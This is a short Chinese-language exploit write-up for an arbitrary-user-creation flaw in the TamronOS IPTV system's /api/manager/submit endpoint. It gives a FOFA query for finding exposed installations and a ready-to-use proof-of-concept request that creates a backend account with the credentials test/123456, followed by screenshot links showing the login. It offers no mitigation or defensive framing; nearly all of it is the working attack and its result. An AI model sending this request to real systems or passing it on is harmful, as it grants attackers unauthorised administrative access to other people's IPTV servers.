# TamronOS IPTV系统 submit 任意用户创建漏洞

## 漏洞描述

TamronOS IPTV系统 /api/manager/submit 存在任意用户创建漏洞，攻击者通过漏洞可以任意用户创建进入后台

## 漏洞影响

```
TamronOS IPTV系统
```

## FOFA

```
app="TamronOS-IPTV系统"
```

## 漏洞复现

登录页面如下



![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202101926166.png)



漏洞POC为



```plain
/api/manager/submit?group=1&username=test&password=123456
```



![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202101926524.png)



```plain
user: test
pass: 123456
```



![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202101926288.png)